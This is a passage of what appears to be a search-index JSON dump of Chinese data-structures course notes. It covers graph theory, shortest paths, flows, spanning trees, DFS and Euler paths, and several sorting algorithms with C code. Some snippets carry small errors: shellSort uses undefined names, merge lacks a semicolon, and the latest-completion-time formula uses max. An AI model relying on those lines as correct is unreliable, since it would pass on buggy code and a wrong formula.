<li>\u5b50\u56fe\uff08subgraph\uff09\uff1a\u8fb9\u96c6\u548c\u70b9\u96c6\u90fd\u662f\u539f\u56fe\u7684\u5b50\u96c6</li> <li>\u8def\u5f84\u3001\u8def\u5f84\u957f\u5ea6\u90fd\u4e0d\u5fc5\u591a\u8bf4<ul> <li>\u7b80\u5355\u8def\u5f84\uff08simple path\uff09\uff1a\u8def\u5f84\u4e0a\u7684\u70b9\u4e0d\u91cd\u590d</li> </ul> </li> <li>\u56de\u8def\uff08cycle\uff09\uff1a\u8def\u5f84\u7684\u8d77\u70b9\u548c\u7ec8\u70b9\u76f8\u540c</li> <li>\u5bf9\u4e8e\u65e0\u5411\u56fe\uff1a<ul> <li>\u5982\u679c\u5b58\u5728\u4e00\u6761\u4ece \\(v_i\\) \u5230 \\(v_j\\) \u7684\u8def\u5f84\uff0c\u5219\u79f0 \\(v_i\\) \u548c \\(v_j\\) \u8fde\u901a\uff08connected\uff09</li> <li>\u5982\u679c\u4efb\u610f\u4e00\u5bf9\u70b9\u90fd\u8fde\u901a\uff0c\u5219\u79f0\u8fd9\u4e2a\u65e0\u5411\u56fe\u662f\u8fde\u901a\u7684\uff08connected graph\uff09</li> <li>\u8fde\u901a\u5206\u91cf\uff1a\u65e0\u5411\u56fe\u7684\u6781\u5927\u8fde\u901a\u5b50\u56fe</li> </ul> </li> <li>\u6811\u662f\u8054\u901a\u7684\u65e0\u73af\u56fe</li> <li>DAG\uff08directed acyclic graph\uff09\uff1a\u6709\u5411\u65e0\u73af\u56fe</li> <li>\u5bf9\u4e8e\u6709\u5411\u56fe\uff1a<ul> <li>\u5982\u679c\u5b58\u5728\u4e00\u6761\u4ece \\(v_i\\) \u5230 \\(v_j\\) \u7684\u8def\u5f84\uff0c\u5219\u79f0 \\(v_i\\) \u53ef\u8fbe\uff08reachable\uff09\\(v_j\\)</li> <li>\u5982\u679c\u4efb\u610f\u4e00\u5bf9\u70b9\u90fd\u53ef\u8fbe\uff0c\u5219\u79f0\u8fd9\u4e2a\u6709\u5411\u56fe\u662f\u5f3a\u8fde\u901a\u7684\uff08strongly connected\uff09</li> <li>\u5f3a\u8fde\u901a\u5206\u91cf\uff1a\u6709\u5411\u56fe\u7684\u6781\u5927\u5f3a\u8fde\u901a\u5b50\u56fe</li> <li>\u5982\u679c\u6709\u5411\u56fe\u4e0d\u662f\u5f3a\u8fde\u901a\u7684\uff0c\u4f46\u5b83\u7684\u57fa\u7840\u56fe\uff08\u8fb9\u53bb\u6389\u65b9\u5411\u5f97\u5230\u7684\u65e0\u5411\u56fe\uff09\u662f\u8fde\u901a\u7684\uff0c\u5219\u79f0\u8fd9\u4e2a\u6709\u5411\u56fe\u662f\u5f31\u8fde\u901a\u7684\uff08weakly connected\uff09</li> </ul> </li> <li>\u5ea6\u6570\uff1a<ul> <li>\u5bf9\u4e8e\u65e0\u5411\u56fe\uff0c\u8282\u70b9 \\(v\\) \u7684\u5ea6\u6570 \\(\\mathrm{degree}(v)\\) \u662f\u4e0e \\(v\\) \u76f8\u90bb\u7684\u8282\u70b9\u6570</li> <li>\u5bf9\u4e8e\u6709\u5411\u56fe\uff0c\u8282\u70b9 \\(v\\) \u7684\u5165\u5ea6\u6570 \\(\\mathrm{indegree}(v)\\) \u662f\u4ee5 \\(v\\) \u4e3a\u7ec8\u70b9\u7684\u8fb9\u6570\uff0c\u51fa\u5ea6\u6570 \\(\\mathrm{outdegree}(v)\\) \u662f\u4ee5 \\(v\\) \u4e3a\u8d77\u70b9\u7684\u8fb9\u6570</li> <li>\u8fb9\u6570\u7b49\u4e8e\u6240\u6709\u8282\u70b9\u7684\u5ea6\u6570\u4e4b\u548c\u9664\u4ee5 2</li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/summary1/#_15","title":"\u56fe\u7684\u8868\u793a","text":"<ul> <li>\u90bb\u63a5\u77e9\u9635\uff1a<ul> <li>\u5982\u679c\u5b58\u5728\u4e00\u6761\u4ece \\(v_i\\) \u5230 \\(v_j\\) \u7684\u8fb9\uff0c\u5219 \\(a_{ij}=1\\)\uff0c\u5426\u5219 \\(a_{ij}=0\\)</li> <li>\u5bf9\u4e8e\u975e\u7a20\u5bc6\u56fe\u6765\u8bf4\u975e\u5e38\u6d6a\u8d39\u7a7a\u95f4</li> </ul> </li> <li>\u90bb\u63a5\u8868\uff1a<ul> <li>\u5bf9\u4e8e\u6bcf\u4e2a\u8282\u70b9\uff0c\u5b58\u50a8\u4e00\u4e2a\u94fe\u8868\u6765\u8bb0\u5f55\u6240\u6709\u548c\u5b83\u76f8\u4e34\u7684\u8282\u70b9</li> <li>\u5bf9\u4e8e\u65e0\u5411\u56fe\u4f1a\u5c06\u6bcf\u4e2a\u8fb9\u5b58\u50a8\u4e24\u6b21</li> <li>\u5bf9\u4e8e\u6709\u5411\u56fe\u65e0\u6cd5\u904d\u5386\u5165\u5ea6\uff0c\u9700\u8981\u989d\u5916\u5b58\u50a8\u4e00\u4e2a\u9006\u90bb\u63a5\u8868</li> </ul> </li> <li>\u5e26\u6743\u56fe\uff1a<ul> <li>\u90bb\u63a5\u77e9\u9635\uff1a\\(a_{ij}\\) \u5b58\u50a8\u8fb9 \\((v_i, v_j)\\) \u7684\u6743\u91cd</li> <li>\u90bb\u63a5\u8868\uff1a\u6bcf\u4e2a\u94fe\u8868\u8282\u70b9\u5b58\u50a8\u8fb9\u7684\u6743\u91cd</li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/summary1/#_16","title":"\u62d3\u6251\u6392\u5e8f","text":"<ul> <li>AOV \u7f51\u8def\uff1a\u5b9a\u70b9\u8868\u793a\u6d3b\u52a8\uff0c\u8fb9\u8868\u793a\u6d3b\u52a8\u4e4b\u95f4\u7684\u5148\u540e\u5173\u7cfb<ul> <li>\u53ef\u4ee5\u5b9e\u73b0\u7684 AOV \u7f51\u8def\u4e00\u5b9a\u662f DAG\uff08\u6709\u5411\u65e0\u73af\u56fe\uff09</li> </ul> </li> <li>\u5982\u679c\u5b58\u5728\u4e00\u6761\u4ece \\(i\\) \u5230 \\(j\\) \u7684\u8def\u5f84\uff0c\u5219\u79f0 \\(i\\) \u662f \\(j\\) \u7684\u524d\u9a71\uff08predecessor\uff09\uff0c\\(j\\) \u662f \\(i\\) \u7684\u540e\u7ee7\uff08successor\uff09</li> <li>\u5982\u679c\u5b58\u5728\u4e00\u6761\u8fb9 \\(&lt;i, j&gt;\\)\uff0c\u5219\u79f0 \\(i\\) \u662f \\(j\\) \u7684\u76f4\u63a5\uff08immediate\uff09\u524d\u9a71\uff0c\\(j\\) \u662f \\(i\\) \u7684\u76f4\u63a5\u540e\u7ee7</li> <li>\u62d3\u6251\u6392\u5e8f\uff08topological order\uff09\u662f\u4e00\u4e2a\u56fe\u7684\u70b9\u96c6\u7684\u7ebf\u6027\u5e8f\u5217\uff0c\u6ee1\u8db3\uff1a<ul> <li>\u5bf9\u4e8e\u4efb\u610f\u4e00\u5bf9\u70b9 \\(i, j\\)\uff0c\u5982\u679c \\(i\\) \u662f \\(j\\) \u7684\u524d\u9a71\uff0c\u5219\u5e8f\u5217\u4e2d \\(i\\) \u5728 \\(j\\) \u7684\u524d\u9762</li> </ul> </li> </ul> <pre><code>void topsort(Graph G) {\n    Queue Q = CreateQueue(); \n    int cnt = 0; Vertex V, W;\n    for (each vertex V)\n        if (indegree[V] == 0) Enqueue(Q, V);\n    while (!IsEmpty(Q)) {\n        V = Dequeue(Q); \n        TopNum[V] = ++cnt;\n        for (each W adjacent to V)\n            if (--indegree[W] == 0) Enqueue(Q, W);\n    }\n    if (cnt != NumVertex) Error(\"Graph has a cycle\");\n    free(Q);\n}\n</code></pre>"},{"location":"cs/algorithm/ds/summary1/#_17","title":"\u6700\u77ed\u8def\u7b97\u6cd5","text":"<ul> <li>\u5355\u6e90\u6700\u77ed\u8def\uff1a\u7ed9\u5b9a\u4e00\u4e2a\u6709\u5411\u56fe\u548c\u4e00\u4e2a\u6e90\u70b9\uff0c\u6c42\u4ece\u6e90\u70b9\u5230\u56fe\u4e2d\u6bcf\u4e2a\u70b9\u7684\u6700\u77ed\u8def\u5f84</li> <li>\u65e0\u6743\u56fe\u7684\u5355\u6e90\u6700\u77ed\u8def\uff1aBFS \u5373\u53ef</li> <li>\u5e26\u6743\u56fe\u7684\u5355\u6e90\u6700\u77ed\u8def\uff1aDijkstra \u7b97\u6cd5\uff0c\u5806\u4f18\u5316\u590d\u6742\u5ea6 \\(O(E\\log V)\\)<ol> <li>\u521d\u59cb\u5316 dis[s] = 0\uff0c\u5176\u4ed6 dis[v] = \u221e</li> <li>\u4ece\u5806\u4e2d\u53d6\u5168\u5c40 dis[x] \u6700\u5c0f\u7684\u3001\u4e14\u672a\u8bbf\u95ee\u8fc7\u7684 x\uff0c\u5c06 x \u6807\u8bb0\u4e3a\u5df2\u8bbf\u95ee</li> <li>\u626b\u63cf x \u7684\u6240\u6709\u51fa\u8fb9 (x, y)<ul> <li>\u82e5 dis[y] &gt; dis[x] + weight(x, y)\uff0c\u5219\u66f4\u65b0 dis[y] = dis[x] + weight(x, y)\uff0c\u5e76\u5c06 {y, dis[y]} \u538b\u5165\u5806\u4e2d</li> </ul> </li> </ol> </li> <li>\u5e26\u8d1f\u6743\u8fb9\uff1a<ul> <li>SPFA \u7b97\u6cd5\uff0c\u590d\u6742\u5ea6 \\(O(VE)\\) <pre><code>void WeightNegative(Table T) {\n    Queue Q = CreateQueue(); Vertex V, W;\n    Enqueue(Q, s);\n    while (!IsEmpty(Q)) {\n        V = Dequeue(Q);\n        for (each W adjacent to V) {\n            if (T[V].dist + w &lt; T[W].dist) {\n                T[W].dist = T[V].dist + w;\n                T[W].path = V;\n                if (W is not already in Q) Enqueue(Q, W);\n            }\n        }\n    }\n    free(Q);\n}\n</code></pre></li> </ul> </li> <li>AOE\uff08Activity On Edge\uff09\u7f51\u7edc<ul> <li>\u89c4\u5212\u6d3b\u52a8\u8fdb\u884c\u7684\u987a\u5e8f</li> <li>\u6709\u5411\u65e0\u73af\u56fe</li> <li>\u6bcf\u4e2a\u8282\u70b9\u5b58\u5728\u4e00\u4e2a\u6700\u65e9\u5b8c\u6210\u65f6\u95f4\uff08earliest completion time\uff09EC[v] \u548c\u6700\u665a\u5b8c\u6210\u65f6\u95f4\uff08latest completion time\uff09LC[v]</li> <li>\u6bcf\u6761\u8fb9\u5b58\u5728\u4e00\u4e2a\u6301\u7eed\u65f6\u95f4\uff08lasting time\uff09\u4e5f\u5c31\u662f\u8fb9\u6743 C\uff0c\u8fd8\u6709\u4e00\u4e2a\u677e\u5f1b\u65f6\u95f4\uff08slack time\uff09</li> <li>\u8ba1\u7b97<ul> <li>\\(EC[w]=\\max_{&lt;v,w&gt;\\in E}\\{EC[v]+C_{v,w}\\}\\)</li> <li>\\(LC[v]=\\max_{&lt;v,w&gt;\\in E}\\{LC[w]-C_{v,w}\\}\\)</li> <li>\u8fb9 \\(&lt;v,w&gt;\\) \u7684\u677e\u5f1b\u65f6\u95f4\u4e3a \\(LC[w]-EC[v]-C_{v,w}\\)</li> </ul> </li> <li>\u5173\u952e\u8def\u5f84\uff08critical path\uff09\u4e3a\u5168\u662f 0 \u677e\u5f1b\u65f6\u95f4\u7684\u8fb9\u6784\u6210\u7684\u8def\u5f84</li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/summary1/#_18","title":"\u7f51\u7edc\u6d41","text":"<ul> <li>\u6700\u5927\u6d41\uff1a\u7ed9\u5b9a\u4e00\u4e2a\u6709\u5411\u56fe\uff0c\u6c42\u4ece\u6e90\u70b9\u5230\u6c47\u70b9\u7684\u6700\u5927\u6d41\u91cf</li> <li>\u5efa\u7acb\u6b8b\u5dee\u56fe\uff08residual graph\uff09\uff0c\u8bbe \\(f\\) \u662f\u56fe \\(G=(V, E)\\) \u7684\u4e00\u4e2a\u6d41\u91cf\uff0c\u5219\u6b8b\u5dee\u56fe\u7684\u8fb9\u6743\u4e3a\uff1a</li> </ul> \\[ c_f(u, v) = \\begin{cases}     c(u, v) - f(u, v) &amp; \\text{if } (u, v) \\in E\\\\     f(v, u) &amp; \\text{if } (v, u) \\in E\\\\     0 &amp; \\text{otherwise} \\end{cases} \\] <ul> <li>\u627e\u6b8b\u5dee\u56fe\u4e2d\u4ece\u6e90\u70b9\u5230\u6c47\u70b9\u7684\u4e00\u6761\u7b80\u5355\u8def\u5f84\uff0c\u79f0\u4e3a\u589e\u5e7f\u8def\uff08augmenting path\uff09</li> <li>\u589e\u5e7f\u8def\u7684\u6d41\u91cf\u4e3a\u589e\u5e7f\u8def\u4e0a\u7684\u6700\u5c0f\u8fb9\u6743\uff0c\u521b\u5efa\u8fd9\u6837\u4e00\u6761\u6d41\u91cf\uff0c\u66f4\u65b0\u6b8b\u5dee\u56fe\uff0c\u76f4\u5230\u627e\u4e0d\u5230\u589e\u5e7f\u8def\u4e3a\u6b62</li> </ul>"},{"location":"cs/algorithm/ds/summary1/#_19","title":"\u6700\u5c0f\u751f\u6210\u6811","text":"<ul> <li>\u6700\u5c0f\u751f\u6210\u6811\uff08minimum spanning tree\uff09\u662f\u7ed9\u5b9a\u4e00\u4e2a\u8fde\u901a\u56fe\uff0c\u627e\u4e00\u4e2a\u603b\u8fb9\u6743\u6700\u5c0f\u7684\u751f\u6210\u6811<ul> <li>\u751f\u6210\u6811\u4e3a\u56fe\u7684\u4e00\u4e2a\u5b50\u56fe\uff0c\u5305\u542b\u6240\u6709\u70b9\uff0c\u4e14\u4efb\u610f\u4e24\u70b9\u4e4b\u95f4\u6709\u4e14\u4ec5\u6709\u4e00\u6761\u8fb9</li> </ul> </li> <li>\u8fde\u901a\u56fe\u4e00\u5b9a\u5b58\u5728\u4e00\u4e2a\u6700\u5c0f\u751f\u6210\u6811</li> <li>\u5411\u751f\u6210\u6811\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u989d\u5916\u7684\u8fb9\uff0c\u5219\u4e00\u5b9a\u4f1a\u5b58\u5728\u4e00\u4e2a\u73af</li> <li>Prim \u7b97\u6cd5     <pre><code>T = \u6700\u5c0f\u6743\u8fb9\nfor i = 1..n-2\n    e = \u4e0e T \u4e2d\u7684\u70b9\u76f8\u8fde\u4e14\u52a0\u5165 T \u540e\u4e0d\u4f1a\u5f62\u6210\u73af\u7684\u6700\u5c0f\u6743\u8fb9\n    \u5c06 e \u52a0\u5165 T\nT \u5373\u4e3a\u6700\u5c0f\u751f\u6210\u6811\n</code></pre></li> <li>Kruskal \u7b97\u6cd5     <pre><code>T = \u7a7a\u56fe\nfor i = 1..n-1\n    e = \u52a0\u5165 T \u4e2d\u4e0d\u4f1a\u5f62\u6210\u73af\u7684\u6700\u5c0f\u6743\u8fb9\n    \u5c06 e \u52a0\u5165 T\nT \u5373\u4e3a\u6700\u5c0f\u751f\u6210\u6811\n</code></pre><ul> <li>\u53ef\u4ee5\u901a\u8fc7\u5e76\u67e5\u96c6\u6765\u7ef4\u62a4<ol> <li>\u5efa\u7acb\u5e76\u67e5\u96c6</li> <li>\u5c06\u8fb9\u6309\u7167\u6743\u503c\u4ece\u5c0f\u5230\u5927\u6392\u5e8f</li> <li>\u4ece\u5c0f\u5230\u5927\u904d\u5386\u6240\u6709\u8fb9\uff0c\u82e5\u4e24\u4e2a\u7aef\u70b9\u4e0d\u5728\u540c\u4e00\u96c6\u5408\uff0c\u5219\u5c06\u4e24\u4e2a\u7aef\u70b9\u5408\u5e76\uff0c\u5c06\u8fb9\u52a0\u5165 T\uff1b\u5728\u540c\u4e00\u96c6\u5408\u4e2d\u5219\u5ffd\u7565</li> </ol> </li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/summary1/#_20","title":"\u6df1\u5ea6\u4f18\u5148\u641c\u7d22","text":"<ul> <li>\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\uff08depth-first search\uff0cDFS\uff09\u662f\u4e00\u79cd\u7528\u4e8e\u904d\u5386\u6216\u641c\u7d22\u6811\u6216\u56fe\u7684\u7b97\u6cd5</li> <li>\u662f\u5148\u5e8f\u904d\u5386\u7684\u4e00\u79cd\u63a8\u5e7f     <pre><code>void dfs(Vertex V) {\n    Visited[V] = true;\n    for (each W adjacent to V)\n        if (!Visited[W]) dfs(W);\n}\n</code></pre></li> <li>\u53cc\u8fde\u901a\u6027<ul> <li>\u5982\u679c\u53bb\u6389\u4e00\u4e2a\u70b9\uff0c\u5269\u4e0b\u7684\u56fe\u4e0d\u518d\u662f\u8fde\u901a\u7684\uff0c\u5219\u79f0\u8fd9\u4e2a\u70b9\u4e3a\u5272\u70b9\uff08cut vertex\uff09\uff0c\u6216 articulation point</li> <li>\u5982\u679c\u56fe \\(G\\) \u662f\u8fde\u901a\u7684\uff0c\u5e76\u4e14\u6ca1\u6709 articulation point\uff0c\u5219\u79f0 \\(G\\) \u662f\u53cc\u8fde\u901a\u7684</li> <li>\u53cc\u8fde\u901a\u5206\u91cf\uff08biconnected component\uff09\u662f\u6781\u5927\u7684\u53cc\u8fde\u901a\u5b50\u56fe</li> <li>Tarjan \u7b97\u6cd5<ul> <li>dfn[x] \u8868\u793a x \u7b2c\u4e00\u6b21\u88ab\u8bbf\u95ee\u7684\u65f6\u95f4\u6233\uff08dfs \u65f6\u7b2c\u51e0\u4e2a\u88ab\u8bbf\u95ee\uff0c\u4ece 0 \u5f00\u59cb\uff09</li> <li>\u8ffd\u6eaf\u503c low[x]<ul> <li>\u521d\u59cb low[x] = dfn[x]</li> <li>\u5bf9\u4e8e\u4ece x \u5230 y \u7684\u8fb9\uff0c\u5982\u679c &lt;x, y&gt; \u5728\u641c\u7d22\u6811\u4e0a\uff0c\u5219 low[x] = min(low[x], low[y])</li> <li>\u5982\u679c &lt;x, y&gt; \u4e0d\u5728\u641c\u7d22\u6811\u4e0a\uff0c\u5219 low[x] = min(low[x], dfn[y])</li> </ul> </li> <li>\u627e\u5272\u70b9<ul> <li>\u5982\u679c u \u662f root\uff0c\u5219 u \u662f\u5272\u70b9\u5f53\u4e14\u4ec5\u5f53 u \u6709\u81f3\u5c11\u4e24\u4e2a\u513f\u5b50</li> <li>\u5982\u679c u \u4e0d\u662f root \u5219 u \u662f\u5272\u70b9\u5f53\u4e14\u4ec5\u5f53\u5b58\u5728\u4e00\u4e2a\u513f\u5b50 v\uff0c\u6ee1\u8db3 dfn[u] &lt;= low[v]</li> </ul> </li> </ul> </li> </ul> </li> <li> <p>\u6b27\u62c9\u56de\u8def\u4e0e\u6b27\u62c9\u8def\u5f84</p> <ul> <li>\u6b27\u62c9\u56de\u8def\uff08Euler circuit\uff09\u4e3a\u5305\u542b\u6240\u6709\u8fb9\u7684\u7b80\u5355\u73af\uff0c\u6b27\u62c9\u8def\u5f84\uff08Euler path\uff09\u4e3a\u5305\u542b\u6240\u6709\u8fb9\u7684\u7b80\u5355\u8def\u5f84</li> <li>\u65e0\u5411\u56fe<ul> <li>\u65e0\u5411\u56fe G \u6709\u6b27\u62c9\u56de\u8def\u5f53\u4e14\u4ec5\u5f53 G \u662f\u8fde\u901a\u7684\u4e14\u6bcf\u4e2a\u9876\u70b9\u7684\u5ea6\u6570\u90fd\u662f\u5076\u6570</li> <li>\u65e0\u5411\u56fe G \u6709\u6b27\u62c9\u8def\u5f84\u5f53\u4e14\u4ec5\u5f53 G \u662f\u8fde\u901a\u7684\u4e14\u6709\u4e14\u4ec5\u6709\u4e24\u4e2a\u9876\u70b9\u7684\u5ea6\u6570\u662f\u5947\u6570</li> </ul> </li> <li>\u6709\u5411\u56fe<ul> <li>\u6709\u5411\u56fe G \u6709\u6b27\u62c9\u56de\u8def\u5f53\u4e14\u4ec5\u5f53 G \u662f\u5f31\u8fde\u901a\u7684\u4e14\u6bcf\u4e2a\u9876\u70b9\u7684\u51fa\u5ea6\u7b49\u4e8e\u5165\u5ea6</li> <li>\u6709\u5411\u56fe G \u6709\u6b27\u62c9\u8def\u5f84\u5f53\u4e14\u4ec5\u5f53 G \u662f\u5f31\u8fde\u901a\u7684\u4e14\u6709\u4e14\u4ec5\u6709\u4e00\u4e2a\u9876\u70b9\u7684\u51fa\u5ea6\u6bd4\u5165\u5ea6\u5927 1\uff0c\u6709\u4e14\u4ec5\u6709\u4e00\u4e2a\u9876\u70b9\u7684\u5165\u5ea6\u6bd4\u51fa\u5ea6\u5927 1\uff0c\u5176\u4f59\u9876\u70b9\u7684\u51fa\u5ea6\u7b49\u4e8e\u5165\u5ea6</li> </ul> </li> <li>dfs \u5373\u53ef</li> </ul> \u4ee3\u7801 <pre><code>void dfs(int x) {\n    for (int y = 1; y &lt;= maxn; ++y) {\n        if (G[x][y]) {\n            G[x][y] = 0;\n            G[y][x] = 0;\n            dfs(y);\n        }\n    }\n    ans[++ansi] = x;\n    return;\n}\nfor (int i = 1; i &lt;= maxn; ++i) {\n    if (deg[i] % 2) {\n        cnt++;\n        if (!root) root = i;\n    }\n}\nif (!root) {\n    for (int i = 1; i &lt;= maxn; ++i) {\n        if (deg[i]) {\n            root = i; break;\n        }\n    }\n}\nif (cnt &amp;&amp; cnt != 2) {\n    printf(\"No Solution\\n\");\n    return 0;\n}\ndfs(root);\n</code></pre> </li> </ul>"},{"location":"cs/algorithm/ds/summary2/","title":"\u6392\u5e8f\u4e0e\u54c8\u5e0c","text":"<p> \u7ea6 2097 \u4e2a\u5b57  150 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>Abstract</p> <p>\u300c\u6570\u636e\u7ed3\u6784\u57fa\u7840\u300d\u8bfe\u7a0b \u6392\u5e8f\u3001\u54c8\u5e0c \u90e8\u5206\u5185\u5bb9\u590d\u4e60\u4e0e\u603b\u7ed3</p>"},{"location":"cs/algorithm/ds/summary2/#_2","title":"\u6392\u5e8f","text":""},{"location":"cs/algorithm/ds/summary2/#_3","title":"\u63d2\u5165\u6392\u5e8f","text":"<pre><code>void insertionSort(int arr[], int n) {\n    for (int P = 1; P &lt; n; ++P) {\n        int tmp = arr[P];\n        int i;\n        for (i = P; i &gt; 0 &amp;&amp; arr[i - 1] &gt; tmp; --i)\n            arr[i] = arr[i - 1];\n        arr[i] = tmp;\n    }\n}\n</code></pre> <ul> <li>\u8fdb\u884c \\(n-1\\) \u8d9f\uff08pass\uff09\u6392\u5e8f</li> <li>\u7b2c \\(P\\) \u8d9f\u65f6\u4fdd\u8bc1\u4ece\u4f4d\u7f6e 0 \u5230 \\(P-1\\) \u4e0a\u7684\u5143\u7d20\u4ee5\u53ca\u6392\u597d\u5e8f\uff0c\u7136\u540e\u5c06\u7b2c \\(P\\) \u4e2a\u5143\u7d20\u63d2\u5165\u5230\u524d\u9762\u7684\u6709\u5e8f\u5e8f\u5217\u7684\u6b63\u786e\u4f4d\u7f6e\u5904</li> <li>\u6700\u574f\uff08A \u662f\u9006\u5e8f\u7684\uff09\u590d\u6742\u5ea6 \\(O(N^2)\\)</li> <li>\u6700\u597d\uff08A \u662f\u6709\u5e8f\u7684\uff09\u590d\u6742\u5ea6 \\(O(N)\\)</li> </ul>"},{"location":"cs/algorithm/ds/summary2/#_4","title":"\u5e0c\u5c14\u6392\u5e8f","text":"<ul> <li>\u5e0c\u5c14\u6392\u5e8f\uff08shell sort\uff09\u4f7f\u7528\u4e00\u4e2a\u589e\u91cf\u5e8f\u5217 \\(h_1&lt;h_2&lt;\\cdots&lt;h_t\\)\uff0c\u5176\u4e2d \\(h_i\\) \u4e3a\u6574\u6570\uff0c\u4e14 \\(h_i=1\\)</li> <li>\u5b9a\u4e49 \\(h_k\\)-sort \u4e3a\u5c06\u539f\u6570\u7ec4\u9694 \\(h_k-1\\) \u4e2a\u5143\u7d20\u5206\u4e3a\u4e00\u7ec4\uff0c\u6bcf\u7ec4\u5185\u8fdb\u884c\u6392\u5e8f</li> <li>\\(k = t, t-1, \\cdots, 1\\) \u4f9d\u6b21\u8fdb\u884c \\(h_k\\)-sort\uff0c\u6700\u7ec8\u5f97\u5230\u4e00\u4e2a\u6709\u5e8f\u5e8f\u5217<ul> <li>\\(h_k\\)-sorted \u7684\u5e8f\u5217\u5728 \\(h_{k-1}\\)-sorted \u540e\u4ecd\u4fdd\u6301 \\(h_k\\)-sorted \u7684\u6027\u8d28</li> </ul> </li> <li>\u5e0c\u5c14\u6392\u5e8f\u7684\u590d\u6742\u5ea6\u548c\u589e\u91cf\u5e8f\u5217\u7684\u9009\u53d6\u6709\u5173</li> <li> <p>\u5e0c\u5c14\u589e\u91cf\u5e8f\u5217\uff1a\\(h_t=\\lfloor N/2\\rfloor, h_k = \\lfloor h_{k+1}/2\\rfloor\\)</p> <ul> <li>\u6700\u574f\u590d\u6742\u5ea6 \\(O(N^2)\\)\uff08\u5373\u53ea\u5728 1-sort \u65f6\u8fdb\u884c\u4e86\u6392\u5e8f\uff09</li> </ul> \u4ee3\u7801 <pre><code>void shellSort(int arr[], int n) {\n    int i, j, tmp;\n    for (int inc = N/2; inc &gt; 0; inc /= 2) {\n        for (i = inc; i &lt; N; ++i) {\n            tmp = arr[i];\n            for (j = i; j &gt;= inc; j -= inc) {\n                if (tmp &lt; arr[j - inc])\n                    arr[j] = arr[j - inc];\n                else\n                    break;\n            }\n            a[j] = tmp;\n        }\n    }\n}\n</code></pre> </li> <li> <p>Hibbard \u589e\u91cf\u5e8f\u5217\uff1a\\(h_k = 2^k-1\\)</p> <ul> <li>\u6700\u574f\u590d\u6742\u5ea6 \\(O(N^{3/2})\\)</li> <li>\u5e73\u5747\u590d\u6742\u5ea6 \\(O(N^{5/4})\\)</li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/summary2/#_5","title":"\u5806\u6392\u5e8f","text":"<ul> <li>\u4f7f\u7528\u5806\u7ed3\u6784\u6765\u8fdb\u884c\u6392\u5e8f</li> <li>\u7b97\u6cd5\u4e00\uff1a\u5c06\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u4f9d\u6b21\u63d2\u5165\u5230\u5806\u4e2d\uff08\u53ef\u4ee5\u662f \\(O(N)\\) \u7ebf\u6027\u5efa\u5806\uff09\uff0c\u7136\u540e\u4f9d\u6b21\u4ece\u5806\u4e2d\u53d6\u51fa\u6700\u5c0f\u5143\u7d20<ul> <li>\u590d\u6742\u5ea6 \\(O(N\\log N)\\)</li> <li>\u4f46\u662f\u7a7a\u95f4\u6d88\u8017\u7ffb\u500d\u4e86</li> </ul> </li> <li>\u7b97\u6cd5\u4e8c\uff1a<ul> <li>\u4ee5\u7ebf\u6027\u65f6\u95f4\u5efa\u6700\u5927\u5806\uff08PercolateDown\uff09</li> <li>\u5c06\u5806\u9876\u5143\u7d20\u4e0e\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u4ea4\u6362\uff08\u76f8\u5f53\u4e8e\u5220\u9664\u6700\u5927\u5143\u7d20\uff09\uff0c\u7136\u540e\u8fdb\u884c PercolateDown</li> <li>\u4f9d\u6b64\u5faa\u73af\uff0cN-1 \u6b21\u5220\u9664\u540e\u5f97\u5230\u4e00\u4e2a\u4ece\u5c0f\u5230\u5927\u7684\u5e8f\u5217 <pre><code>void heapSort(int arr[], int n) {\n    for (int i = n / 2; i &gt;= 0; --i) \n        percolateDown(arr, i, n);\n    for (int i = n - 1; i &gt; 0; --i) {\n        swap(&amp;arr[0], &amp;arr[i]);\n        percolateDown(arr, 0, i);\n    }\n}\n</code></pre></li> <li>\u5e73\u5747\u6bd4\u8f83\u6b21\u6570\u4e3a \\(2N\\log N - O(N\\log\\log N)\\)</li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/summary2/#_6","title":"\u5f52\u5e76\u6392\u5e8f","text":"<ul> <li>\u5173\u952e\u7684\u64cd\u4f5c\u662f\u5408\u5e76\u4e24\u4e2a\u6709\u5e8f\u5217\u8868\u53d8\u6210\u4e00\u4e2a\u6709\u5e8f\u5217\u8868\uff0c\u53ef\u4ee5\u5728 \\(O(n)\\) \u65f6\u95f4\u5185\u5b8c\u6210</li> <li>\u5f52\u5e76\u64cd\u4f5c\u5219\u53ef\u4ee5\u9012\u5f52\u8fdb\u884c\uff0c\u5206\u800c\u6cbb\u4e4b\uff0c\u4f9d\u6b21\u5408\u5e76</li> <li>\u590d\u6742\u5ea6\uff1a</li> </ul> \\[ \\begin{align*} T(1) &amp;= 1\\\\ T(N) &amp;= 2T(\\frac{N}{2}) + O(N)\\\\ &amp;= 2^kT(\\frac{N}{2^k})+k\\cdot O(N)\\\\ &amp;= N\\cdot T(1) + \\log N \\cdot O(N)\\\\ &amp;= O(N + N\\log N) = O(N\\log N) \\end{align*} \\] \u4ee3\u7801 <pre><code>void mergeSort(int arr[], int n) {\n    int *tmp = malloc(sizeof(int) * n);\n    if (tmp != NULL) {\n        mergeSortHelper(arr, tmp, 0, n - 1);\n        free(tmp);\n    } else {\n        printf(\"No space for tmp array!\\n\");\n    }\n}\n\nvoid mergeSortHelper(int arr[], int tmp[], int left, int right) {\n    if (left &lt; right) {\n        int center = (left + right) / 2;\n        mergeSortHelper(arr, tmp, left, center);\n        mergeSortHelper(arr, tmp, center + 1, right);\n        merge(arr, tmp, left, center + 1, right);\n    }\n}\n\nvoid merge(int arr[], int tmp[], int leftPos, int rightPos, int rightEnd) {\n    int leftEnd = rightPos - 1;\n    int tmpPos = leftPos\n    int numElements = rightEnd - leftPos + 1;\n    while (leftPos &lt;= leftEnd &amp;&amp; rightPos &lt;= rightEnd)\n        if (arr[leftPos] &lt;= arr[rightPos])\n            tmp[tmpPos++] = arr[leftPos++];\n        else\n            tmp[tmpPos++] = arr[rightPos++];\n    while (leftPos &lt;= leftEnd)\n        tmp[tmpPos++] = arr[leftPos++];\n    while (rightPos &lt;= rightEnd)\n        tmp[tmpPos++] = arr[rightPos++];\n    for 